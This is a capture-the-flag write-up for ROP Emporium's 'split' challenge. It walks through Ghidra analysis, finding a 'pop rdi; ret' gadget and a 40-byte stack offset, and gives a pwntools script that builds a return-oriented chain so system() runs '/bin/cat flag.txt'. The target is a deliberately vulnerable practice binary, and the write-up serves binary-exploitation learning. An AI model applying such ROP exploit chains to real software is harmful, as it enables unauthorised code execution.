# split Writeup

## Steps:
1. Run split
```
$ ./split  
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> AAAA
Thank you!

Exiting
```

2. Analyze in ghidra.

Notice function `usefulFunction` - we will want to use this system call but need to change it's contents. We will try to pop something into EDI to print the flag.
```
void usefulFunction(void)

{
  system("/bin/ls");
  return;
}


00400746 bf 4a 08        MOV        EDI,s_/bin/ls_0040084a        = "/bin/ls"
          40 00
0040074b e8 10 fe        CALL       <EXTERNAL>::system            int system(char * __command)
          ff ff

```
Search memory to see if there is a string we could replace it with, and we find:
```
00601061	62 69 6e 2f	bin/	usefulString	ds "/bin/cat flag.txt"
```
2. Use `ropGadet` to identify a gadget we can use to place `usefulString` in edi.
```
$ ROPgadget --binary split | grep 'pop'

0x00000000004007c3 : pop rdi ; ret
```
4. Determine the distance to the return. `0x28` means we need `40 bytes` of garbage to reach the return pointer
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined pwnme()
             undefined         <UNASSIGNED>   <RETURN>
             undefined1[32]    Stack[-0x28]   input                                   XREF[2]:     004006f0(*), 
                                                                                                   0040071f(*)  
                             pwnme                                           XREF[3]:     main:004006d2(c), 00400880, 
                                                                                          00400948(*)  
        004006e8 55              PUSH       RBP

```
3. Create the payload:
   - 40 bytes of garbage
   - pop RDI address
   - usefulString address
   - system call address 
```
from pwn import *

p = process('./split')

#gdb.attach(p, gdbscript='b *main')

system = 0x40074b
pop = 0x4007c3
usestr = 0x601060

payload = b"A" * 40
payload += p64(pop) + p64(usestr) + p64(system)

p.sendline(payload)
p.interactive()
```

## Solution:
```
$ python3 exploit.py
[+] Starting local process './split': pid 49293
[*] Switching to interactive mode
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> $ 
Thank you!

Exiting
[*] Got EOF while reading in interactive
$ 
[*] Process './split' stopped with exit code -11 (SIGSEGV) (pid 49293)
[*] Got EOF while sending in interactive
```
